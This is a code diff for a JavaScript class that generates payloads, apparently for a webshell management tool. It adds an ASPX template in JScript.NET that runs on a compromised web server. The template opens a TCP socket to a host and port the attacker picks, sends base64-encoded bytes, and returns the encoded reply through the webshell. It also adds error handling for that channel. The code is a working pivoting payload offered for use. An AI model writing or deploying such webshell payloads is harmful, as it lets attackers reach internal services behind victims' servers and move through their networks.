@@ -15,7 +15,11 @@ class Core {
   }
 
   decode(str) {
-    return Buffer.from(str, 'base64');
+    let b64buff = Buffer.from(str, 'base64');
+    if (b64buff.toString().indexOf('ERROR://') > -1) {
+      throw new Error(b64buff.toString());
+    }
+    return b64buff;
   }
 
   get template() {
@@ -35,7 +39,32 @@ if(!$conn){
   @fclose($conn);
 }`,
       'asp': (cmdbuf) => ``,
-      'aspx': (cmdbuf) => ``,
+      'aspx': (cmdbuf) => `try{
+var ipAddress = "${this.host.split(':')[0]}";
+var portNum = ${this.host.split(':')[1]};
+var sendbytes = System.Convert.FromBase64String("${this.encode(cmdbuf)}");
+var remoteEndPoint = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(ipAddress), portNum);
+var client = new System.Net.Sockets.Socket(
+    System.Net.Sockets.AddressFamily.InterNetwork,
+    System.Net.Sockets.SocketType.Stream,
+    System.Net.Sockets.ProtocolType.Tcp
+);
+client.Connect(remoteEndPoint);
+client.Send(sendbytes);
+var recvStr = "";
+var bytes = 0;
+var receiveBuffer = new byte[1024];
+do {
+    bytes = client.Receive(receiveBuffer, receiveBuffer.Length, System.Net.Sockets.SocketFlags.None);
+    recvStr += System.Text.Encoding.UTF8.GetString(receiveBuffer, 0, bytes);
+}while (bytes == 1024);
+client.Shutdown(System.Net.Sockets.SocketShutdown.Both);
+client.Close();
+Response.Write(System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(recvStr)));
+} catch (err) {
+  Response.Write(System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("ERROR:// " + err.message)));
+}
+`,
     }
   }
 }
